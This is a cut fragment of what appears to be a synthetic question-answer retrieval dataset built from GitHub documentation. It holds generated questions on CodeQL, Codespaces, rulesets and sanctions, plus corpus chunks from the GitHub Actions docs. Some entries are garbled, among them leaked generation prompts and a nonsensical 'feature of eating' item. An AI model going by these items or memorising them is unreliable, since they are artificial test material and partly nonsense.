be in the appropriate U.S. federal courts\" in the given text?", "bd925f82-f6e4-4e28-b3d0-daa4970f5154": "What is the significance of the statement \"context information is below\" in the provided text material", "0fdf56eb-f59c-4a39-935a-1788ed5f0eab": "What steps should you take before generating a CodeQL database for a branch or pull request, and what information is necessary for this process", "475ad234-d948-4dbd-be72-83de311fd48c": "How can you prepare your code for analysis using CodeQL, and what is required before generating a CodeQL database", "4f3554ef-49e1-4680-a482-edb8db3c8455": "How do you create a new database using {% data variables.product.prodname_codeql %} for a specific language? Provide the necessary command and options required for this process.2. What is the purpose of specifying the `--command` option while creating a new database using {% data variables.product.prodname_codeql %}? When should this option be used?", "3aaf3a90-d6ad-4d76-a7c8-d9b645eee037": "How can the --db-cluster option be used in multi-language codebases to generate separate databases for each language specified by --language", "e0440cc1-4c9a-46e9-b786-812dd7d4df19": "What is the recommended option to suppress the build command for languages where the {% data variables.product.prodname_codeql_cli %} does not need to monitor the build?", "65bd3ff3-3ce6-412d-b60e-510f5dfa1d14": "How does the JavaScript extractor create a hierarchical representation of JavaScript and TypeScript code in a repository", "cbb4b301-21b5-485b-9884-3bb985c30470": "What command is used to create a {% data variables.product.prodname_codeql %} database for multiple languages in a repository, and what options are available to customize the process?", "523dc07e-3fbe-4587-85d0-536e11c41a06": "What is the purpose of running the command \"database create\" in the {% data variables.product.prodname_codeql_cli %}", "82524bef-a7fa-4eff-bb43-b72a84b90331": "How can you ensure that all additional dependencies are available when creating databases for non-compiled languages like JavaScript, Python, and Ruby using the {% data variables.product.prodname_codeql_cli %}?", "b6b81dd5-68d9-4e4d-a8dd-faaaca316d08": "How can you create a database for a project that uses multiple languages, including a compiled language, using {% data variables.product.prodname_codeql %}? Provide the necessary command line syntax and any additional dependencies required.2. When creating a database for Python using {% data variables.product.prodname_codeql %}, what are the requirements for the Python environment and how should the command line syntax be modified to specify the language and source root?", "96b5398a-c8f4-4374-8489-31e9326a261d": "How does {% data variables.product.prodname_codeql %} create databases for compiled languages, and what is required for this process", "6bcde806-2728-4fd1-898e-3071cadb9fd0": "What is an autobuilder in the context of {% data variables.product.prodname_codeql %} and how does it help in creating databases for compiled languages without specifying any build commands? Provide an example of how to use an autobuilder for a Java codebase.", "2ae51dc3-1090-49a0-bb22-90cb3d93ca00": "How can I ensure that all code is built in a C# project when creating a database in {% data variables.product.prodname_codeql %}", "a0247e97-3220-4200-b49e-4ce66cbba802": "How can I specify build commands for a C++ project using the `make` tool in {% data variables.product.prodname_codeql %}", "ff87db6c-e64b-4061-a181-a68c71ed6be0": "How do you create a new CodeQL database for a Java project using the CodeQL CLI? Provide the exact command with the necessary parameters.2. How do you create a new CodeQL database for a Swift project using the CodeQL CLI? Provide the exact command with the necessary parameters, specifying whether the project is built using Xcode or `swift build`. If the project is built using Xcode, also specify whether the `archive` and `test` options should be passed to `xcodebuild`. If the project is built using a custom build script, provide the name of the script.", "9a5320f4-005a-4493-8c80-89a20445fe32": "How can we create a CodeQL database using indirect build tracing, and what options should be specified during the initialization process", "7c74bb40-4e33-4461-90ec-0e79354e83a0": "What environment variables need to be set in the shell for indirect build tracing, and what operating system is required for this method?", "89ab3534-1bed-41e3-9ae3-e41395ddfe97": "What specific actions should I take based on the context information to successfully answer questions related to this topic during the quiz/examination", "8cb12bee-297f-4b53-a7ce-fcef7cedee35": "How can I prepare for the upcoming quiz/examination by utilizing the context information provided", "c7173d44-4d0e-46cb-b2e8-4bfc345d7ab0": "Generate according to: Context information is below.---------------------treated in /temp/tracingEnvironment. Please run one of these scripts before invoking your build command.Based on your operating system, we recommend you run: ...```The `codeql database init` command creates `/temp/tracingEnvironment` with files that contain environment variables and values that will enable {% data variables.product.prodname_codeql %} to trace a sequence of build steps. These files are named `start-tracing.{json,sh,bat,ps1}`. Use one of these files with your CI system\u2019s mechanism for setting environment variables", "b692a4b0-6ec8-492f-8cda-0a2f4744e87b": "How are {% data variables.product.prodname_codeql %} environment variables set in the provided YAML configuration, and what is their significance in the build pipeline?", "bf7862e1-3227-4166-af7d-1e83164b4187": "What is the purpose of initializing a {% data variables.product.prodname_codeql %} database in an Azure DevOps pipeline, and how is it done in the provided YAML configuration", "67ec9594-4146-45a8-ba5e-0b6b08c0b11d": "What is the significance of reading and setting environment variables at the end of the build process, as described in the context information?", "d7bba261-7da7-401c-95c6-a5c501cd1ba8": "What is the purpose of executing a clean build before starting the build process, as mentioned in the context information", "51912b2f-b891-4a93-a6e1-9c0e55ce0e71": "What should I do if I want to try out a paid plan for a {% data variables.product.prodname_github_app %} in my personal GitHub account", "a58d6f01-396d-430b-8dac-7af4ae1967a1": "What is the process for installing a {% data variables.product.prodname_oauth_app %} in my personal GitHub account", "a46ae668-4376-405a-94b9-3cb07ad9aeab": "Generate according to: About installing {% data variables.product.prodname_oauth_apps %} in your personal account{% data reusables.marketplace.marketplace-apps-only %}If you choose a paid plan, you'll pay for your app subscription on your personal account's current billing date using your existing payment method.{% data reusables.marketplace.free-trials %}For more information about installing a {% data variables.product.prodname_github_", "c6740bc3-57ef-4fe9-a630-c5cbe8c8c820": "What is the purpose of a codespace name in the context of GitHub Codespaces? How is it generated and where can it be found", "ace9d941-a7cd-468a-aa93-aec075378f6e": "What is the difference between a codespace name and display name in the context of GitHub Codespaces? Can the display name be changed and how does this affect the permanent name?", "33b532f2-c4aa-4a91-a367-f7d2f59a3f28": "If the side bar in {% data variables.product.prodname_github_codespaces %} includes a \"Codespace Performance\" section, how can I copy the Codespace ID using the interface provided", "99d676da-690a-449a-8dc8-e0ec8bb72e73": "If the \"Codespace Performance\" section is not displayed in the side bar, how can I enable it through the \"Settings\" tab in {% data variables.product.prodname_github_codespaces %} for {% data variables.product.prodname_vscode_shortname %}?", "24fd5414-4418-4719-9672-5b30d428f732": "How does GitHub notify your app of a customer's pricing plan change, and what actions are considered an upgrade or downgrade", "e774ef91-dc3f-4ff3-8b7e-6889511cf597": "What information should you extract from the `marketplace_purchase` webhook to update a customer's plan and make changes to their billing cycle?", "ab947621-f7f3-4e3e-99b2-41c66c342aaa": "How can developers encourage users to upgrade their plans on GitHub Marketplace, and what resources are available to them for this purpose", "36d1eb08-6437-4be6-b8b8-28a0c50cb8b4": "What information should developers periodically synchronize using the `GET /marketplace_listing/plans/:id/accounts` endpoint to ensure accurate pricing and unit counts for their users?", "28adcad8-2089-4384-9737-ecbc5d73f9aa": "What is the difference between a team's profile picture and an organization's profile picture in GitHub, and how can a team's profile picture be set separately from the organization's profile picture?", "8436c033-2804-4be3-99ed-650f98c3a6d9": "How can a team maintainer or organization owner set a profile picture for a team in GitHub, and what is the consequence of not doing so", "5a9eea43-0a80-4213-b7f5-4198962390ae": "How can someone with read access to a repository view the rulesets targeting a specific branch or tag", "81bd31d0-d0dd-4ade-b4d2-5a32a3884a2e": "How can someone edit or delete a ruleset for a repository in GitHub?", "3f7254d5-5155-4986-89a0-49708b244f46": "How can I view insights for rulesets in a repository using GitHub's settings page", "066d8eea-5949-4e25-9cc0-f3c7d1a4ef2d": "What is ruleset history and how can I access it for a specific repository on GitHub", "4e4622af-ba25-4d1a-881a-ddece18a8126": "How can I filter rule insights by ruleset, branch, actor, and time period on GitHub's \"Rule Insights\" page", "af1ba64f-83f5-4415-91d4-8a4a2d6f7c0b": "How can I access the \"Rule Insights\" page on GitHub's settings page for a specific repository", "78c51905-9544-4782-93e8-d635bd50b21a": "What is the difference between importing a ruleset and creating a new ruleset on GitHub's settings page", "c2aebd1b-63c1-44a0-b796-cb62585bee11": "How can I import a ruleset into a repository using GitHub's settings page", "dda0b70b-de84-496a-8bba-a233116070cc": "What is the purpose of rule insights and how can they help me understand the impact of rulesets on a repository", "d261d764-77f1-4c66-8836-30adc4576250": "What is the concept of ruleset history and how can it be useful for managing rulesets in a repository", "7849aa91-64fc-46f2-a5ae-e3ebb25b85b5": "How can you ensure that the questions are diverse in nature across the document?", "2b971f7e-bd5a-486e-8ec6-dcb6653e08c4": "Should troubleshooting content be contained within procedural content or guides", "024f0d35-a63e-4263-80f6-f0cc3ae195cd": "How should questions be focused on one aspect at a time", "7b4d025b-fdcb-4ca8-91a1-9d526da83c76": "How should product and feature owners be involved in documenting known issues", "22fda4d5-8496-48d5-b711-d16944eacc65": "Can you summarize the purpose of known issues in troubleshooting content", "d4a792c0-9ccf-4c0a-b992-088026269d88": "What situations should known issues be used to explain", "4bea31da-6059-41df-ab71-051b8f7274b9": "Should examples be avoided in troubleshooting questions", "1bad3470-7bb7-4725-b5b9-d69281aba1b8": "What types of content can be used to create troubleshooting sections", "4ab12d11-e8a8-41bf-bbb2-c0ccc5ef2039": "How should troubleshooting questions be structured to ensure they are understandable without access to the context", "14963f28-b1ac-48ec-a43e-e8265c270393": "When is it appropriate to create a standalone troubleshooting article", "d0978cb1-5ed2-49f4-9975-e342267ed50f": "What guidelines should be followed while creating titles for troubleshooting content, as mentioned in the context information", "c6b46c70-2a21-4014-ab0b-b8d70e2965ba": "How can troubleshooting content be organized in a product or feature with multiple articles, as suggested in the context information?", "997a32c9-baec-4f0a-9372-291d2e4aec64": "What specific items and collaborators are not copied when I make a new project from an existing one? (Hint: Check the context information provided.)", "65c2bce3-3e73-407a-887a-cfe9b5391f84": "How can I save time configuring views and custom fields in a new project by copying an existing one", "af2cb993-f557-4386-a027-71b1779225a7": "How does Git differ from SVN in terms of directory structure and reference organization? Provide specific examples to support your answer.2. What is the purpose of subprojects in SVN and how are they managed? How does this differ from Git's approach to subprojects? Provide specific examples to illustrate the differences.", "2aa5b8db-8dcb-43a8-a3d4-ec3aa339a245": "Why is Git's ability to modify previous commits and changes considered a difference from SVN's approach to project history? How can this feature be used in Git?", "08448fbe-3624-400b-aa2e-da4b1a32f9b1": "What is the difference between an SVN external and a Git submodule? How are they similar", "fe034b51-ec6e-4833-becc-e5fefe0f4374": "How does the \"--mode\" option in the \"resolve-dependencies\" command affect the behavior of the command? Provide specific examples for each mode.", "9350b6b3-41b2-45a4-89dc-69b2557db3f7": "What is the purpose of the \"resolve-dependencies\" command in the context provided", "891dd77c-2d74-4e69-8ff7-7246f648e9f4": "How can I specify an alternate location to save the lock file generated by dependency resolution using the \"--lock-output\" option in the context information provided?", "08570419-5220-47c5-ad68-aed7baae3089": "What is the purpose of the \"--lock-override\" option in the context information provided", "b2540023-2173-4945-bad7-7f8397556f12": "How can I authenticate to GitHub Enterprise Server Container registries using the CLI tool provided", "fd5d3246-7688-449d-8b6c-626b4bda68b7": "How can I authenticate to the github.com Container registry using the CLI tool provided, without using environment variables?", "910de443-ce74-416a-bb4a-4e89f6b6ce3b": "Given the context information and prior knowledge.generate only answers based on the below query.You are a Teacher/ Professor. Your task is to provide EXACTLY 2 answers for the questions asked in the previous step. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be understandable without having access to the context.Don't provide examples and keep the answers focused on once aspect at a time.answers:1. The action that should be taken if a file does not already exist is to create a new file.2. The feature of eating was introduced in version `v2.15.2`.", "f02ddb96-0498-48a6-8df0-a737b1f0160e": "When was the feature of eating introduced in version `v2.15.2`", "10372c1c-56fb-47f6-a8af-0142e6bf234c": "What action should be taken if a file does not already exist", "e21f40d1-b2e5-48fa-9c81-644444004c1d": "How can custom deployment protection rules be used to approve or reject deployments based on external services like IT Service Management systems, security operations, observability systems, and code quality and testing tools? Provide specific examples of how these services can be integrated with custom deployment protection rules.", "33917016-8bff-4d12-a6fb-ce3c65150283": "What are custom deployment protection rules and how do they work in the context of GitHub Actions", "9297d0d5-351a-4526-9a5b-126fd2e9595c": "How should the custom deployment protection rule be installed and enabled in repositories for this scenario", "74e59200-4499-4b4a-819e-a762e51491f8": "What is the purpose of creating a GitHub App and how should it be configured for this scenario", "c7880d79-3e28-45e7-8ca5-f854d6b70965": "How can a deployment be reviewed on {% data variables.product.prodname_dotcom_the_website %}", "943e1b74-f5d7-4811-aee3-10bdf545b828": "What is the process for generating an install token using the installation ID from a deployment protection rule webhook payload", "a7a389ec-b27d-4336-ab9a-7840f8f1516a": "How can the status of an approval for a workflow run be reviewed using a GET request", "281e5d6c-7c5f-4d1b-acb5-4b095e534c38": "How can a {% data variables.product.prodname_github_app %} be authenticated using a JSON Web Token during an incoming POST request", "8c788494-6cb4-41e6-90ef-facca8249af6": "How can a status report be posted without taking any other action on {% data variables.product.prodname_dotcom_the_website %} during a deployment", "f2f43153-59c9-4724-971e-baa30230f9a8": "How can a request be approved or rejected during a deployment using a POST request", "ec50518c-8870-431f-b2ea-b1e7dfaac0d2": "How can developers discover suitable protection rules for their {% data variables.product.company_short %} repositories using the provided context information", "b2f57499-de1e-4e85-9986-b8de601bc817": "What is the purpose of browsing existing custom deployment protection rules in the given context?", "75bc3ec2-fef9-44bd-ad1d-65040aeda717": "What is the difference between GitHub.com and GitHub Enterprise Server in terms of storing export-controlled information?", "7e250d24-5550-42f8-a92e-6aec3647521e": "What is the responsibility of users in ensuring compliance with U.S. export control laws while accessing and using GitHub.com", "b1f13e1b-71ae-4333-af38-834adda3c602": "What is the Export Control Classification Number (ECCN) of `5D992.c` and what restrictions, if any, apply to its export or re-export", "c0977347-3392-4057-8cd8-11e2e5605f9e": "Which countries and territories are currently subject to U.S. Government sanctions, and what restrictions apply to GitHub's services in those areas? How can individuals or organizations affected by these restrictions appeal the decision?", "350dcb4f-5420-49a5-af30-3f450136820b": "What services are available to developers located in Iran, Cuba, Syria, Crimea, and the separatist areas of Donetsk and Luhansk on GitHub?", "01495fe8-cbb4-4f01-ae75-56f0dc1a22f1": "What is the process for appealing a flag on a GitHub account due to U.S. Economic sanctions", "ef7cdc26-2b55-40ac-8a12-db0388b476e4": "What types of GitHub services are restricted for developers located in North Korea, and why?", "2e084772-9ff1-40a3-b4f7-e978f459f2d2": "How does GitHub determine the location of users and organizations to implement legal restrictions related to U.S. economic sanctions", "4d43db97-3424-4d81-b8bc-4f8173b0fba8": "What actions are allowed for trade-restricted users with private repositories in sanctioned regions, according to GitHub's policy?", "a47802a4-2bd6-4db9-b7f9-ff2f202689e8": "What types of GitHub accounts will be available for developers in Iran under the license obtained by GitHub from OFAC", "d8f041f5-ba81-4d3d-8eb8-cc67c1357b49": "How does GitHub ensure compliance with U.S. and other applicable laws regarding economic sanctions", "6ea9621a-d20f-463e-b25f-e8a312ff4769": "How does GitHub determine if an individual or organization falls into a restricted category under U.S. economic sanctions", "31d30c70-1971-4b58-be55-557766010d25": "What types of parties are generally restricted from accessing or using GitHub, and why", "cfd65ec3-0fec-4fa8-a094-1c42f0f5762f": "How do third parties processing payments for GitHub impact the availability of paid services for Iranian users", "4ef719fd-39dd-475b-a045-7ceebeb72e31": "What options are available for Iranian GitHub users to use paid services under the license received from OFAC", "0649cd18-83d4-4f0e-83c6-fd05361ba5b6": "What is the process for appealing a flag on a GitHub account if an individual or organization believes they have been mistakenly classified as a restricted category under U.S. economic sanctions", "bcb19f3a-b985-4a20-a5a9-6049ac5997af": "Can Cuban developers access GitHub cloud services, both free and paid, and what restrictions, if any, apply to them", "1b53c400-ff47-4781-87a6-065ba0dc6670": "How does the concept of \"AUTOTITLE\" differ from \"AUTOTITLE\"? Provide a detailed explanation.", "d85549e8-2233-4948-a908-21c6c5b948cd": "Based on the context information provided, can you summarize the meaning of \"AUTOTITLE\" in a sentence", "21129e57-aea5-4cb6-9c4d-c51e7e2021da": "What is the purpose of repository secrets in {% data variables.product.prodname_codespaces %} and how are they made available to codespaces at runtime", "8b5448b8-bc3c-4516-8e5f-6644e003040f": "How can you manage secrets, such as access tokens for cloud services, for repositories in {% data variables.product.prodname_codespaces %}? Provide steps for creating, listing, and deleting secrets.", "0914eff7-e516-4b38-b386-f828017ff1fe": "What are the routing algorithms for code review assignments and how do they choose and assign reviewers based on either the round robin or load balance algorithm", "8cf76766-c3c1-4c62-a6c7-878d0c220669": "What are code review settings and how can they be configured to reduce noise and clarify individual responsibility for pull request reviews", "d2371e63-3c63-4317-baf9-685da566b951": "What is auto assignment and how can it be enabled to automatically assign reviewers based on a specified subset of team members when the team has been requested to review a pull request", "1f00d0e6-18df-4f84-b9cf-dc2c34536145": "How can code review assignments be configured to automatically request code owners for review, while still allowing for individual review requests to be made in addition to the team request", "5cb4cac7-9d54-4522-a7a4-27e597e98fad": "What are team notifications and how can they be configured to only notify requested team members instead of sending notifications to the entire team when a team is requested to review a pull request", "29326553-91e3-42fa-927f-502a7bbaca3e": "How can branch protection rules be configured to require review from code owners, while still allowing for auto assignment of reviewers", "8bbe2a80-771c-4cf4-9f43-0acda9b2e93b": "How does the load balance algorithm ensure that each team member reviews an equal number of pull requests in any 30 day period", "39efda55-9cb7-4d70-ba82-e805030194da": "What happens if all team members are busy and a pull request needs to be reviewed? Does it remain assigned to the team or is it left unreviewed? How can this situation be avoided?", "4a1c81e7-f0f8-4f49-9829-eee9e11d20c1": "How do I disable auto assignment for a specific team in the context provided?", "d8d48c2a-63ec-40ca-a7fa-2b4315374544": "How do I request a team review in the context provided", "dae11ed0-8a08-4124-a3cc-3a0ccb129886": "What will happen if I unlink my Patreon account from my GitHub Sponsors profile? Will it cancel existing sponsorships through Patreon?", "0bd860b3-ddfb-4c71-9604-ce4fa22651eb": "How can I disconnect my Patreon account from my GitHub Sponsors profile to prevent new sponsors from sponsoring me through Patreon", "7a5d681a-a8ae-477b-8657-fe12fef46939": "How can I fix the error \"Error: Permission to user/repo denied to user/other-repo\" when pushing with a key that is attached to another repository as a deploy key and does not have access to the repository I am trying to push to? Should I remove the deploy key from the repository and add it to my personal account instead? Or is there another solution? Provide a step-by-step guide on how to do this.", "dd3abfca-25f6-4ce1-8614-79d96c5bcfff": "What is the error message \"Error: Permission to user/repo denied to user/other-repo\" and what does it mean", "c827026c-f90b-4a2a-a156-8b45dfcee6e8": "How can I determine which machine types are available to create a codespace on a specific repository or as an authenticated user", "987fc062-ceff-4a9c-bf5a-7785a8e4de29": "What is the process for changing the machine of an existing codespace by updating its 'machine' property, and when will this update take effect?", "6706d976-e8c7-445c-ac8d-fe6b2fde44df": "What is the policy against maintaining multiple individual accounts in the context of {% data variables.product.prodname_dotcom %} Terms of Service", "0b5fa7af-12fb-4dc6-b9a5-a87180fbd759": "In the fourth scenario, what is the consequence of using an academic email address that has already been used to request a {% data variables.product.prodname_student_pack %} for a different {% data variables.product.prodname_dotcom %} account", "0862e5f0-925e-4213-9967-554679292b02": "In the second scenario, what type of email addresses are considered to have unverified domains", "88f73eb1-83d9-4305-ad5a-91ed4e4645a7": "In the third scenario, what is the issue with schools that issue email addresses prior to paid student enrollment", "d4c04ebd-8a41-4723-9ecc-5d6bca518d48": "Based on the context information provided, what is the reason for requiring further proof of academic status in the first scenario", "588260ad-e4e0-4277-bd56-47c3f4dd9f74": "If you are pursuing a degree which will be terminated in the current academic session, are you eligible for the {% data variables.product.prodname_student_pack %}? Why or why not", "07fb3f90-0085-405e-86d7-69167ac833e3": "If you are a student at a coding school or bootcamp, how can you become eligible for the {% data variables.product.prodname", "41051146-0ec1-4c95-9c29-ccc2fcc064fe": "If you are under 13 years old, are you eligible for the {% data variables.product.prodname_student_pack %}? Why or why not", "b200f1dc-bb16-4da2-81d1-07f3841af464": "If you are enrolled in an informal learning program that is not part of the {% data variables.product.prodname_campus_program %} and not enrolled in a degree or diploma granting course of study, are you eligible for the {% data variables.product.prodname_student_pack %}? Why or why not", "420ad497-b7fa-41dd-95db-7cb32c631295": "How can I retrieve information about repository traffic for repositories that I have write access to using the provided endpoints", "6fc6c4dc-416a-4b53-980e-359fdadcce44": "Can you provide more details about the repository graph and the type of information that can be retrieved using these endpoints?"}, "corpus": {"Y2h1bmtfMF9pbmRleF8xMzE=": "\n\nOverview\n\n{% data variables.product.prodname_actions %} allow you to customize your workflows to meet the unique needs of your application and team. In this guide, we'll discuss some of the essential customization techniques such as using variables, running scripts, and sharing data and artifacts between jobs.\n\n\n\nUsing variables in your workflows\n\n{% data variables.product.prodname_actions %} include default environment variables for each workflow run. If you need to use custom environment variables, you can set these in your YAML workflow file. This example demonstrates how to create custom variables named `POSTGRES_HOST` and `POSTGRES_PORT`. These variables are then available to the `node client.js` script.\n\n```yaml\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Connect to PostgreSQL\n        run: node client.js\n        env:\n          POSTGRES_HOST: postgres\n          POSTGRES_PORT: 5432\n```\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nAdding scripts to your workflow\n\nYou can use a {% data variables.product.prodname_actions %} workflow to run scripts and shell commands, which are then executed on the assigned runner. This example demonstrates how to use the `run` keyword to execute the command `npm install -g bats` on the runner.\n\n```yaml\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm install -g bats\n```\n\nTo use a workflow to run a script stored in your repository you must first check out the repository to the runner. Having done this, you can use the `run` keyword to run the script on the runner. The following example runs two scripts, each in a separate job step. The location of the scripts on the runner is specified by setting a default working directory for run commands. For more information, see \"AUTOTITLE.\"\n\n```yaml\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: ./scripts\n    steps:\n      - name: Check out the repository to the runner\n        uses: {% data reusables.actions.action-checkout %}  \n     ", "Y2h1bmtfMV9pbmRleF8xMzE=": " - name: Run a script\n        run: ./my-script.sh\n      - name: Run another script\n        run: ./my-other-script.sh\n```\n\nAny scripts that you want a workflow job to run must be executable. You can do this either within the workflow by passing the script as an argument to the interpreter that will run the script - for example, `run: bash script.sh` - or by making the file itself executable. You can give the file the execute permission by using the command `git update-index --chmod=+x PATH/TO/YOUR/script.sh` locally, then committing and pushing the file to the repository. Alternatively, for workflows that are run on Linux and Mac runners, you can add a command to give the file the execute permission in the workflow job, prior to running the script:\n\n```yaml\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: ./scripts\n    steps:\n      - name: Check out the repository to the runner\n        uses: {% data reusables.actions.action-checkout %}  \n      - name: Make the script files executable\n        run: chmod +x my-script.sh my-other-script.sh\n      - name: Run the scripts\n        run: |\n          ./my-script.sh\n          ./my-other-script.sh\n```\n\nFor more information about the `run` keyword, see \"AUTOTITLE.\"\n\n\n\nSharing data between jobs\n\nIf your job generates files that you want to share with another job in the same workflow, or if you want to save the files for later reference, you can store them in {% data variables.product.prodname_dotcom %} as _artifacts_. Artifacts are the files created when you build and test your code. For example, artifacts might include binary or package files, test results, screenshots, or log files. Artifacts are associated with the workflow run where they were created and can be used by another job. {% data reusables.actions.reusable-workflow-artifacts %}\n\nFor example, you can create a file and then upload it as an artifact.\n\n```yaml\njobs:\n  example-job:\n    name: Save output\n    runs-on: ubuntu-latest\n    steps:\n      - shell: bash\n        ", "Y2h1bmtfMl9pbmRleF8xMzE=": "run: |\n          expr 1 + 1 > output.log\n      - name: Upload output file\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: output-log-file\n          path: output.log\n```\n\nTo download an artifact from a separate workflow run, you can use the `actions/download-artifact` action. For example, you can download the artifact named `output-log-file`.\n\n```yaml\njobs:\n  example-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Download a single artifact\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: output-log-file\n```\n\nTo download an artifact from the same workflow run, your download job should specify `needs: upload-job-name` so it doesn't start until the upload job finishes.\n\nFor more information about artifacts, see \"AUTOTITLE.\"\n\n\n\nNext steps\n\nTo continue learning about {% data variables.product.prodname_actions %}, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xMzI=": "\n\nAbout expressions\n\nYou can use expressions to programmatically set environment variables in workflow files and access contexts. An expression can be any combination of literal values, references to a context, or functions. You can combine literals, context references, and functions using operators. For more information about contexts, see \"AUTOTITLE.\"\n\nExpressions are commonly used with the conditional `if` keyword in a workflow file to determine whether a step should run. When an `if` conditional is `true`, the step will run.\n\n{% data reusables.actions.expressions-syntax-evaluation %}\n\n{% raw %}\n`${{  }}`\n{% endraw %}\n\n{% note %}\n\n**Note**: The exception to this rule is when you are using expressions in an `if` clause, where, optionally, you can usually omit {% raw %}`${{`{% endraw %} and {% raw %}`}}`{% endraw %}. For more information about `if` conditionals, see \"AUTOTITLE.\"\n\n{% endnote %}\n\n{% data reusables.actions.context-injection-warning %}\n\n\n\nExample setting an environment variable\n\n{% raw %}\n\n```yaml\nenv:\n  MY_ENV_VAR: ${{  }}\n```\n\n{% endraw %}\n\n\n\nLiterals\n\nAs part of an expression, you can use `boolean`, `null`, `number`, or `string` data types.\n\n| Data type | Literal value |\n|-----------|---------------|\n| `boolean` | `true` or `false` |\n| `null`    | `null` |\n| `number`  | Any number format supported by JSON. |\n| `string`  | You don't need to enclose strings in `{% raw %}${{{% endraw %}` and `{% raw %}}}{% endraw %}`. However, if you do, you must use single quotes (`'`) around the string. To use a literal single quote, escape the literal single quote using an additional single quote (`''`). Wrapping with double quotes (`\"`) will throw an error. |\n\n\n\nExample of literals\n\n{% raw %}\n\n```yaml\nenv:\n  myNull: ${{ null }}\n  myBoolean: ${{ false }}\n  myIntegerNumber: ${{ 711 }}\n  myFloatNumber: ${{ -9.2 }}\n  myHexNumber: ${{ 0xff }}\n  myExponentialNumber: ${{ -2.99e-2 }}\n  myString: Mona the Octocat\n  myStringInBraces: ${{ 'It''s open source!' }}\n```\n\n{% endraw %}\n\n\n\nOperators\n\n| Operator    | Description |", "Y2h1bmtfMV9pbmRleF8xMzI=": "\n| ---         | ---         |\n| `( )`       | Logical grouping |\n| `[ ]`       | Index |\n| `.`         | Property de-reference |\n| `!`         | Not |\n| `<`         | Less than |\n| `<=`        | Less than or equal |\n| `>`         | Greater than |\n| `>=`        | Greater than or equal |\n| `==`        | Equal |\n| `!=`        | Not equal |\n| `&&`        | And |\n|  \\|\\| | Or |\n\n  {% note %}\n\n  **Notes:**\n  - {% data variables.product.company_short %} ignores case when comparing strings.\n  - `steps..outputs.` evaluates as a string. {% data reusables.actions.expressions-syntax-evaluation %} For more information, see \"AUTOTITLE.\"\n  - For numerical comparison, the `fromJSON()` function can be used to convert a string to a number. For more information on the `fromJSON()` function, see \"fromJSON.\"\n\n  {% endnote %}\n\n{% data variables.product.prodname_dotcom %} performs loose equality comparisons.\n\n- If the types do not match, {% data variables.product.prodname_dotcom %} coerces the type to a number. {% data variables.product.prodname_dotcom %} casts data types to a number using these conversions:\n\n  | Type    | Result |\n  | ---     | ---    |\n  | Null    | `0` |\n  | Boolean | `true` returns `1`  `false` returns `0` |\n  | String  | Parsed from any legal JSON number format, otherwise `NaN`.  Note: empty string returns `0`. |\n  | Array   | `NaN` |\n  | Object  | `NaN` |\n- A comparison of one `NaN` to another `NaN` does not result in `true`. For more information, see the \"NaN Mozilla docs.\"\n- {% data variables.product.prodname_dotcom %} ignores case when comparing strings.\n- Objects and arrays are only considered equal when they are the same instance.\n\n{% data variables.product.prodname_dotcom %} offers ternary operator like behaviour that you can use in expressions. By using a ternary operator in this way, you can dynamically set the value of an environment variable based on a condition, without having to write separate if-else blocks for each possible option.\n\n\n\nExample\n\n{% raw %}\n\n```yaml\nenv:\n  MY_ENV_VAR: ${{ github.ref ==", "Y2h1bmtfMl9pbmRleF8xMzI=": " 'refs/heads/main' && 'value_for_main_branch' || 'value_for_other_branches' }}\n```\n\n{% endraw %}\n\nIn this example, we're using a ternary operator to set the value of the `MY_ENV_VAR` environment variable based on whether the {% data variables.product.prodname_dotcom %} reference is set to `refs/heads/main` or not. If it is, the variable is set to `value_for_main_branch`. Otherwise, it is set to `value_for_other_branches`.\nIt is important to note that the first value after the `&&` condition must be `truthy` otherwise the value after the `||` will always be returned.\n\n\n\nFunctions\n\n{% data variables.product.prodname_dotcom %} offers a set of built-in functions that you can use in expressions. Some functions cast values to a string to perform comparisons. {% data variables.product.prodname_dotcom %} casts data types to a string using these conversions:\n\n| Type    | Result |\n| ---     | ---    |\n| Null    | `''` |\n| Boolean | `'true'` or `'false'` |\n| Number  | Decimal format, exponential for large numbers |\n| Array   | Arrays are not converted to a string |\n| Object  | Objects are not converted to a string |\n\n\n\ncontains\n\n`contains( search, item )`\n\nReturns `true` if `search` contains `item`. If `search` is an array, this function returns `true` if the `item` is an element in the array. If `search` is a string, this function returns `true` if the `item` is a substring of `search`. This function is not case sensitive. Casts values to a string.\n\n\n\nExample using a string\n\n`contains('Hello world', 'llo')` returns `true`.\n\n\n\nExample using an object filter\n\n`contains(github.event.issue.labels.*.name, 'bug')` returns `true` if the issue related to the event has a label \"bug\".\n\nFor more information, see \"Object filters.\"\n\n\n\nExample matching an array of strings\n\nInstead of writing `github.event_name == \"push\" || github.event_name == \"pull_request\"`, you can use `contains()` with `fromJSON()` to check if an array of strings contains an `item`.\n\nFor example, `contains(fromJSON('[\"push\", \"pull_request\"]'), github.event_name)` re", "Y2h1bmtfM19pbmRleF8xMzI=": "turns `true` if `github.event_name` is \"push\" or \"pull_request\".\n\n\n\nstartsWith\n\n`startsWith( searchString, searchValue )`\n\nReturns `true` when `searchString` starts with `searchValue`. This function is not case sensitive. Casts values to a string.\n\n\n\nExample of `startsWith`\n\n`startsWith('Hello world', 'He')` returns `true`.\n\n\n\nendsWith\n\n`endsWith( searchString, searchValue )`\n\nReturns `true` if `searchString` ends with `searchValue`. This function is not case sensitive. Casts values to a string.\n\n\n\nExample of `endsWith`\n\n`endsWith('Hello world', 'ld')` returns `true`.\n\n\n\nformat\n\n`format( string, replaceValue0, replaceValue1, ..., replaceValueN)`\n\nReplaces values in the `string`, with the variable `replaceValueN`. Variables in the `string` are specified using the `{N}` syntax, where `N` is an integer. You must specify at least one `replaceValue` and `string`. There is no maximum for the number of variables (`replaceValueN`) you can use. Escape curly braces using double braces.\n\n\n\nExample of `format`\n\n{% raw %}\n\n```javascript\nformat('Hello {0} {1} {2}', 'Mona', 'the', 'Octocat')\n```\n\n{% endraw 